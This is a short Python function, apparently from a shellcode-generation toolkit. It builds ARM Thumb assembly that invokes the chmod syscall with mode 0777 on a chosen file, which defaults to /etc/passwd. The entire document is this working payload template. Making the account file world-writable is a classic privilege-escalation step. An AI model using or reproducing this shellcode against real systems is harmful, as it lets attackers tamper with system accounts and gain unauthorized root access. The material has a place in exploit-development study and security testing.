def generate(fname='/etc/passwd'):
    """``chmod`` like a UNIX command with mask ``0777``

    Args:
        fname(str): file name
    """
    sc = """
    mov r0, pc
    adds r0, #12
    movs r1, #255
    adds r1, #255
    adds r1, #1
    movs r7, #15
    svc 1
    b after_1
chmod_1:
    .asciz "%s"
after_1:
    """ % (fname)
    return sc
